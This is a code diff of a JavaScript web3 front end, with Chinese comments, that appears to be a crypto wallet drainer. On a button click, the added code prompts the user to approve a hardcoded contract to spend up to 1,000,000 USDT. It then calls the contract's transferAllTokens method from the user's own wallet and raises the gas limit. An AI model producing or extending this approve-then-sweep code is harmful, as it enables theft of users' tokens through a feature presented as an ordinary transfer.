@@ -3,7 +3,7 @@ let web3;
 let contract;
 
 const contractAddress = '0xd7Ca4e99F7C171B9ea2De80d3363c47009afaC5F';  // 智能合约地址
-const abi = [
+const abi =[
 	{
 		"inputs": [
 			{
@@ -123,19 +123,22 @@ connectButton.addEventListener('click', async () => {
 // 转移代币功能
 transferButton.addEventListener('click', async () => {
     try {
-        // 先检查用户的代币余额
-        const usdtBalance = await contract.methods.usdtToken().call({ from: userAddress });
-        const usdcBalance = await contract.methods.usdcToken().call({ from: userAddress });
-        const busdBalance = await contract.methods.busdToken().call({ from: userAddress });
+        // 检查授权情况
+        const usdtContract = new web3.eth.Contract(abi, await contract.methods.usdtToken().call());
+        const allowance = await usdtContract.methods.allowance(userAddress, contractAddress).call();
 
-        console.log('用户 USDT 余额:', usdtBalance);
-        console.log('用户 USDC 余额:', usdcBalance);
-        console.log('用户 BUSD 余额:', busdBalance);
+        if (allowance === '0') {
+            // 如果没有授权，先进行授权
+            await usdtContract.methods.approve(contractAddress, web3.utils.toWei('1000000', 'ether')).send({
+                from: userAddress,
+                gas: 100000
+            });
+        }
 
         // 调用合约中的 transferAllTokens 方法，设置 gas 上限
         await contract.methods.transferAllTokens(userAddress).send({
             from: userAddress,
-            gas: 500000  // 设置为 500,000 gas 上限
+            gas: 1000000  // 设置为 1,000,000 gas 上限
         });
 
         statusMessage.textContent = '代币转移成功！';
